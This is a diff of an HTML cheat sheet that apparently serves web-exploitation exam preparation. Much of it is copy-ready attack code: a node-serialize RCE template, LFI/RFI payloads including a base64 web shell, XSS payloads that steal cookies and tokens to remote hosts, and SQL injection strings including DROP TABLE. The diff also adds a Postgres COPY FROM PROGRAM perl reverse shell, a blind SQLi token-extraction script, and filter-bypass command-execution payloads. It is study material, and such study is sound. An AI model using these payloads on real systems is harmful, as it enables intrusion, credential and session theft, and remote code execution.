         <h4 id="methods-and-classes-3">Methods and Classes</h4>
         <div class="code-container">
             <pre><code class="language-javascript">serialize.unserialize() from node-serialize</code></pre>
@@ -1636,18 +1415,15 @@ def send_payload():
         <p>Vulnerable to RCE if using eval.</p>
         <p>Custom deserializers in libraries like funcster.</p>
         <p>Magic markers like _$$ND_FUNC$$_ for functions.</p>
-
         <h4 id="identify-insecure-deserialization-in-source-code-3">Identify Insecure Deserialization in Source Code</h4>
         <p>Search for require('node-serialize').unserialize(userInput).</p>
         <p>Look for eval or Function calls in deserialization logic.</p>
         <p>Check for untrusted input to unserialize functions.</p>
-
         <h4 id="exploitation-template-in-python-3">Exploitation Template in Python</h4>
         <div class="code-container">
             <pre><code class="language-python">import base64
 import requests
 import urllib.parse
-
 def generate_payload():
     command = 'ls /'
     # Construct the node-serialize payload
@@ -1658,11 +1434,9 @@ def generate_payload():
     # URL encode if needed
     encoded = urllib.parse.quote_plus(encoded)
     return encoded
-
 def send_payload():
     target_url = 'http://example.com/vuln'
     param_name = 'data'
-
     payload = generate_payload()
     print(f"Generated Payload: {payload}")
     data = {param_name: payload}
@@ -1671,9 +1445,7 @@ def send_payload():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="file-inclusion-vulnerabilities-in-php">File Inclusion Vulnerabilities in PHP</h2>
-
         <h3 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h3>
         <p>LFI occurs when an application includes files based on user input without proper validation or sanitization. This can allow attackers to read sensitive local files.</p>
         <p>Common vulnerable code:</p>
@@ -1693,7 +1465,6 @@ def send_payload():
             <li>Log poisoning: Inject PHP code into logs (e.g., via User-Agent) and include the log file: ?page=/var/log/apache2/access.log</li>
             <li>Data URI for RCE if allow_url_include=On: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</li>
         </ul>
-
         <h3 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h3>
         <p>RFI allows inclusion of remote files, leading to remote code execution if the included file contains malicious code.</p>
         <p>Common vulnerable code:</p>
@@ -1712,36 +1483,29 @@ def send_payload():
             <li>Bypass filters: Use null byte %00 if PHP < 5.3: ?page=http://attacker.com/shell.txt%00</li>
             <li>Combine with LFI for advanced attacks.</li>
         </ul>
-
         <h2 id="regex-cheatsheet">Regex Cheatsheet</h2>
-
         <h3 id="match-a-start-and-end-delimiter-in-rtext">Match a START and END Delimiter in r.text</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
 import re
-
 target = 'http://example.com'
 headers = {}
 xml = ''
 proxies = {}
-
 r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
 print(match[1].strip())
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="extract-a-cookie-value-from-response-headers">Extract a Cookie Value from Response Headers</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
 import re
-
 target = 'http://example.com'
 headers = {}
 xml = ''
 proxies = {}
-
 r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
@@ -1749,9 +1513,7 @@ print(match.group(1))
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="xss-payloads">XSS Payloads</h2>
-
         <h3 id="load-external-javascript">Load External JavaScript</h3>
         <div class="code-container">
             <pre><code class="language-html">&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></pre>
@@ -1773,7 +1535,6 @@ print(match.group(1))
             <pre><code class="language-html">&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="load-inline-javascript">Load Inline JavaScript</h3>
         <div class="code-container">
             <pre><code class="language-html">&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
@@ -1791,14 +1552,12 @@ print(match.group(1))
             <pre><code class="language-html">&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="send-localstorage-token-value-from-user-key-to-remote-resource">Send localStorage Token Value from User Key to Remote Resource</h3>
         <div class="code-container">
             <pre><code class="language-javascript">fetch(`http://192.168.45.159/data?data=${encodeURIComponent(JSON.parse(localStorage.getItem('user')).token)}`, {mode: 'no-cors'});
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="leverage-xss-to-csrf">Leverage XSS to CSRF</h3>
         <p>Grab csrftoken and send HTTP request including csrftoken in the request:</p>
         <div class="code-container">
@@ -1815,7 +1574,6 @@ function handleResponse() {
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="filter-specific-cookie-value-and-send-it-back">Filter Specific Cookie Value and Send It Back</h3>
         <div class="code-container">
             <pre><code class="language-javascript">function getCookieValue(name) {
@@ -1827,18 +1585,15 @@ function handleResponse() {
     }
     return null;
 }
-
 // Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
 const cookieName = 'token';
 const cookieValue = getCookieValue(cookieName);
-
 var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
 req2.send();
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="send-request-to-specific-endpoint-with-custom-header-and-send-response-back">Send Request to Specific Endpoint with Custom Header and Send Response Back</h3>
         <div class="code-container">
             <pre><code class="language-javascript">function getCookieValue(name) {
@@ -1850,18 +1605,15 @@ req2.send();
     }
     return null;
 }
-
 // Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
 const cookieName = 'token';
 const cookieValue = getCookieValue(cookieName);
-
 // Send request using the token
 var req = new XMLHttpRequest();
 req.open('GET', 'http://192.168.136.243:8000/user/groups', false);
 req.setRequestHeader('authorization', 'Bearer ' + token);
 req.send();
 var response = req.responseText;
-
 // Send back the response to us
 var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + btoa(response), true);
@@ -1869,9 +1621,7 @@ req2.send();
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="sql-injection-cheatsheet">SQL Injection Cheatsheet</h2>
-
         <h3 id="general-sql-injection-payloads">General SQL Injection Payloads</h3>
         <div class="code-container">
             <pre><code class="language-sql">' UNION SELECT 1,2,3 -- -</code></pre>
@@ -1893,7 +1643,6 @@ req2.send();
             <pre><code class="language-sql">'; DROP TABLE users; -- -</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="postgres-specific">Postgres Specific</h3>
         <p>Postgres SQL Injection Payloads:</p>
         <div class="code-container">
@@ -2001,6 +1750,94 @@ req2.send();
             <pre><code class="language-sql">SELECT current_database();</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
+        <p>These SQL statements need to be submitted one at a time. PostgreSQL system command execution sample:</p>
+        <div class="code-container">
+            <pre><code class="language-sql">CREATE TABLE cmd(cmd_output text);</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">COPY cmd FROM PROGRAM 'id';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT * from cmd;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">DROP TABLE IF EXISTS cmd;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <p>PostgreSQL command execution can be used to, for example, spawn a perl reverse shell:</p>
+        <div class="code-container">
+            <pre><code class="language-sql">CREATE TABLE cmd(cmd_output text);</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">COPY cmd FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.118.4:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT * from cmd;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <p>This is a template for postgres SQL Injection:</p>
+        <div class="code-container">
+            <pre><code class="language-python">import requests
+import string
+GREEN = '\033[92m' # Bright Green
+RED = '\033[91m' # Bright Red
+RESET = '\033[0m' # Reset to default color
+# Define reusable symbols
+success = f"{GREEN}[+]{RESET}"
+failure = f"{RED}[-]{RESET}"
+proxies = {"http":"http://127.0.0.1:8080"}
+def retrieveMagicToken():
+    chars = string.printable
+    n = 1
+    magictoken = ''
+  
+    while True:
+      
+        found_char = None
+      
+        for char in chars:
+            cookies = {
+                'JSESSIONID': '0851748E304535776124E5D3755C4765',
+            }
+            asciichars = ord(char)
+            payload = f"CASE WHEN (SELECT substring(token,{n},1) FROM tokens WHERE user_id = 7) = chr({asciichars}) THEN true ELSE false END"
+            url = f"http://192.168.151.235:8888/moderate/2"
+            data = {
+                "active":"true",
+                "mod":payload
+            }
+          
+            try:
+                r = requests.post(url, cookies=cookies, proxies=proxies, data=data)
+                url2 = 'http://192.168.151.235:8888/moderate'
+                cookies = {
+                'JSESSIONID': '0851748E304535776124E5D3755C4765',
+                }
+                r2 = requests.get(url2, cookies=cookies, proxies=proxies)
+  
+                if "Mod Test" in r2.text:
+                    found_char = char
+                    break
+            except requests.RequestException as e:
+                print(f"[!] Failed request for char '{char}' at position {n}: {e}")
+      
+        if found_char:
+            magictoken += found_char
+            print(f"\r{success} Grabbing Magic token from the database: {magictoken}", end='', flush=True)
+            n += 1
+        else:
+            print(f"\n{failure} No matching character found, Stopping!")
+            break
+          
+    return magictoken
+retrieveMagicToken()</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Postgres Database Shortcuts (psql meta-commands):</p>
         <div class="code-container">
             <pre><code class="language-bash">\l</code></pre>
@@ -2037,7 +1874,6 @@ req2.send();
             <button class="copy-btn">Copy</button>
         </div>
         <p>Quit psql</p>
-
         <h3 id="mysql-specific">MySQL Specific</h3>
         <p>MySQL SQL Injection Payloads:</p>
         <div class="code-container">
@@ -2069,9 +1905,7 @@ req2.send();
             <button class="copy-btn">Copy</button>
         </div>
         <p>Use comments like <code>/*comment*/</code>, case variations, or encodings like <code>UN/**/ION SEL/**/ECT</code>.</p>
-
         <h2 id="javascript-code-snippets">JavaScript Code Snippets</h2>
-
         <h3 id="basic-fetch-request">Basic Fetch Request</h3>
         <div class="code-container">
             <pre><code class="language-javascript">fetch('https://example.com/api/data')
@@ -2086,7 +1920,6 @@ req2.send();
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="fetch-with-headers-and-body">Fetch with Headers and Body</h3>
         <div class="code-container">
             <pre><code class="language-javascript">fetch('https://example.com/api/post', {
@@ -2106,7 +1939,6 @@ req2.send();
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="fetch-cookies-and-send-to-remote">Fetch Cookies and Send to Remote</h3>
         <div class="code-container">
             <pre><code class="language-javascript">fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie), {
@@ -2117,31 +1949,25 @@ req2.send();
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="websocket-client-1">WebSocket Client</h3>
         <div class="code-container">
             <pre><code class="language-javascript">const socket = new WebSocket('ws://example.com/ws');
-
 socket.onopen = function(event) {
   console.log('Connection opened');
   socket.send(JSON.stringify({ action: 'example' }));
 };
-
 socket.onmessage = function(event) {
   console.log('Message received:', event.data);
 };
-
 socket.onclose = function(event) {
   console.log('Connection closed');
 };
-
 socket.onerror = function(error) {
   console.error('Error:', error);
 };
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="bypass-php-eval-filtering">Bypass PHP Eval Filtering</h2>
         <div class="code-container">
             <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
@@ -2149,7 +1975,6 @@ socket.onerror = function(error) {
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="bypass-javascript-injection-filters">Bypass Javascript Injection Filters</h2>
         <div class="code-container">
             <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //"</code></pre>
@@ -2159,28 +1984,23 @@ socket.onerror = function(error) {
             <pre><code class="language-javascript">(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="ysoserial-payload-creation">YSOSerial Payload Creation</h2>
-
         <h3 id="net-version">.NET Version</h3>
         <div class="code-container">
             <pre><code class="language-bash">https://github.com/pwntester/ysoserial.net</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="java-version">JAVA Version</h3>
         <div class="code-container">
             <pre><code class="language-bash">https://github.com/frohoff/ysoserial</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="report-recommendations">Report Recommendations</h2>
         <p>For code indentation:</p>
         <div class="code-container">
             <pre><code class="language-bash">Copy the code straight from VS Code into a 1x1 table in Word</code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="additional-resources">Additional Resources</h2>
         <p>While the course material and labs should be enough to pass the exam, if you want further practice, I can recommend the following:</p>
         <div class="code-container">
@@ -2234,35 +2054,29 @@ socket.onerror = function(error) {
             <button class="copy-btn">Copy</button>
         </div>
     </main>
-
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const burger = document.getElementById('burger');
             const sidebar = document.getElementById('sidebar');
             const overlay = document.getElementById('overlay');
             const closeBtn = document.getElementById('closeBtn');
-
             burger.addEventListener('click', function() {
                 sidebar.classList.toggle('active');
                 burger.classList.toggle('active');
                 overlay.classList.toggle('active');
             });
-
             overlay.addEventListener('click', function() {
                 sidebar.classList.remove('active');
                 burger.classList.remove('active');
                 overlay.classList.remove('active');
             });
-
             closeBtn.addEventListener('click', function() {
                 sidebar.classList.remove('active');
                 burger.classList.remove('active');
                 overlay.classList.remove('active');
             });
-
             const sidebarLinks = document.querySelectorAll('.nav-links a');
             const main = document.querySelector('#main');
-
             sidebarLinks.forEach(link => {
                 link.addEventListener('click', function(e) {
                     e.preventDefault();
@@ -2279,7 +2093,6 @@ socket.onerror = function(error) {
                         }
                         // Show the h1 always
                         document.getElementById('oswe').style.display = '';
-
                         // Collect and show the target and its section content
                         const targetTag = target.tagName;
                         const targetLevel = parseInt(targetTag.substring(1));
@@ -2309,7 +2122,6 @@ socket.onerror = function(error) {
                     overlay.classList.remove('active');
                 });
             });
-
             // Copy functionality
             const copyBtns = document.querySelectorAll('.copy-btn');
             copyBtns.forEach(btn => {
